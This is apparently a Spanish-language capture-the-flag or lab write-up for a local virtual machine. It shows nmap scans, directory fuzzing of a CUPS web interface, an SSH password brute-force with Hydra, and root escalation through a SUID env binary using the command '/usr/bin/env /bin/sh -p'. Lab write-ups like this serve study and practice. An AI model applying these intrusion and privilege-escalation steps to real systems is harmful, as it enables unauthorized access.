
----

- Reconocimiento de todos los puertos Nmap 

```bash

nmap -p- --open -sS -Pn -n -vvv --min-rate 5000 192.168.1.25 -oG AllPorts


PORT    STATE SERVICE REASON
22/tcp  open  ssh     syn-ack ttl 64
80/tcp  open  http    syn-ack ttl 64
631/tcp open  ipp     syn-ack ttl 64
MAC Address: 00:0C:29:3F:BB:A6 (VMware)
```

-  Scripts básicos de reconocimiento y versiones vulnerables 

```bash
nmap -p22,80,631 -sCV 192.168.1.25 -oN Targeted

PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp  open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Test Debian Default Page: It works
631/tcp open  ipp     CUPS 2.3
|_http-server-header: CUPS/2.3 IPP/2.1
|_http-title: Inicio - CUPS 2.3.3op2
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 00:0C:29:3F:BB:A6 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

- Script de reconocimiento de vulnerabilidades 
*Nada en general*
```bash
nmap -p22,80,631 --script "vuln" -Pn -n 192.168.1.21
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-24 17:39 -05
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap done: 1 IP address (0 hosts up) scanned in 35.84 seconds
```

---

### Fuzzing

```java
/jobs                 (Status: 200) [Size: 2465]
/help                 (Status: 200) [Size: 3470]
/de                   (Status: 200) [Size: 2342]
/admin                (Status: 200) [Size: 4904]
/es                   (Status: 200) [Size: 2511]
/ru                   (Status: 200) [Size: 2974]
/ja                   (Status: 200) [Size: 2500]
/printers             (Status: 200) [Size: 2539]
/classes              (Status: 200) [Size: 2120]
/administration       (Status: 200) [Size: 4904]
/'                    (Status: 403) [Size: 373]
/jobsearch            (Status: 200) [Size: 2465]
/jobseeker            (Status: 200) [Size: 2465]
/administrator        (Status: 200) [Size: 4904]
/administr8           (Status: 200) [Size: 4904]
/administrative       (Status: 200) [Size: 4904]
/jobsite71            (Status: 200) [Size: 2465]
/administratie        (Status: 200) [Size: 4904]
/jobs-off             (Status: 200) [Size: 2465]
/pt_BR                (Status: 200) [Size: 2561]
/admins               (Status: 200) [Size: 4904]
/jobsbutton           (Status: 200) [Size: 2465]
/admin_images         (Status: 200) [Size: 4904]
/administrivia        (Status: 200) [Size: 4904]
/jobs_but             (Status: 200) [Size: 2465]
/jobs_banner          (Status: 200) [Size: 2465]
/jobseekers           (Status: 200) [Size: 2465]
/Oasis - 'Definitely Maybe' (Status: 403) [Size: 373]
/Who's-Connecting     (Status: 403) [Size: 373]
/jobsblog             (Status: 200) [Size: 2465]
/jobsite              (Status: 200) [Size: 2465]
/printersupplies      (Status: 200) [Size: 2539]
/administrative-law   (Status: 200) [Size: 4904]
/administrators       (Status: 200) [Size: 4904]
/admin1               (Status: 200) [Size: 4904]
/jobs_nav             (Status: 200) [Size: 2465]
/jobs_sm              (Status: 200) [Size: 2465]
/jobsite-gif          (Status: 200) [Size: 2465]
/administer           (Status: 200) [Size: 4904]
/jobs_logo            (Status: 200) [Size: 2465]
/admin3_gtpointup     (Status: 200) [Size: 4904]
/admin_hp             (Status: 200) [Size: 4904]
/jobshq               (Status: 200) [Size: 2465]
/jobseekerx           (Status: 200) [Size: 2465]
/jobstar              (Status: 200) [Size: 2465]
/jobscipher           (Status: 200) [Size: 2465]
/admin25              (Status: 200) [Size: 4904]
/%3FRID%3D2671        (Status: 200) [Size: 2511]
/don%27t%20fuck%20this%20up (Status: 403) [Size: 373]
/Godwin%27s_Law       (Status: 403) [Size: 373]
/Hacker's Delight     (Status: 403) [Size: 373]
/Handyman's Handbook  (Status: 403) [Size: 373]
/Sam's Teach Yourself Adobe Photoshop CS2 in 24 (Status: 403) [Size: 373]
/admin02              (Status: 200) [Size: 4904]
/administrationinfo   (Status: 200) [Size: 4904]
/jobspage             (Status: 200) [Size: 2465]
/jobs-descriptions    (Status: 200) [Size: 2465]
/RA_Bust'em           (Status: 403) [Size: 373]
/jobsclassified       (Status: 200) [Size: 2465]
/admin2               (Status: 200) [Size: 4904]
/What%27s_afoot       (Status: 403) [Size: 373]
/Cabela's African Safari100 Mb (Status: 403) [Size: 373]
/Cabela's African Safari (Status: 403) [Size: 373]
/adminhelp            (Status: 200) [Size: 4904]
/administratoraccounts (Status: 200) [Size: 4904]
/jobsitenav           (Status: 200) [Size: 2465]
/jobs_39x21           (Status: 200) [Size: 2465]
/Women%27s_Health     (Status: 403) [Size: 373]
/Men%27s_Health       (Status: 403) [Size: 373]
/Godwin's_law         (Status: 403) [Size: 373]
/jobs_post            (Status: 200) [Size: 2465]
/People%27s_Daily     (Status: 403) [Size: 373]
/I Don't Need A Man   (Status: 403) [Size: 373]
/Call Me When You're Sober (Status: 403) [Size: 373]
/I Don't Feel Like Dancing (Status: 403) [Size: 373]
/That's That          (Status: 403) [Size: 373]
/Let's Ride           (Status: 403) [Size: 373]
/Everything's Just Wonderful (Status: 403) [Size: 373]
/jobs_1               (Status: 200) [Size: 2465]
/jobs_86x401          (Status: 200) [Size: 2465]
/adminoffice          (Status: 200) [Size: 4904]
/administracja        (Status: 200) [Size: 4904]
/jobs1                (Status: 200) [Size: 2465]
/jobsite_logo         (Status: 200) [Size: 2465]
/Women%27s%20Rights%20in%20Islam%20-%20Modernising%20or%20Outdated (Status: 403) [Size: 373]
/%22julie%20roehm%22  (Status: 403) [Size: 373]
/%22james%20kim%22    (Status: 403) [Size: 373]
/%22britney%20spears%22 (Status: 403) [Size: 373]
```

--- 

### Explotación 

- Encontramos que en la ruta de *http://192.168.1.25:631/printers/?*  hay una gestion administradora de impresoras, por la que vemos un nombre de usuario el cual es *dimitri* por lo que con esto y con el puerto 22 abierto realizamos un ataque de fuerza bruta con [[Hydra]] y nos da que la contraseña es *mememe* .


- Accedemos al usuario de dimitri y vemos que realizando la busqueda de SUID , tiene un permiso el binario de /usr/bin/env por lo que escalamos privilegios apoyándonos de la información de la pagina de GTFobins 

```bash
/usr/bin/env /bin/sh -p     # Nos da una shell como root
```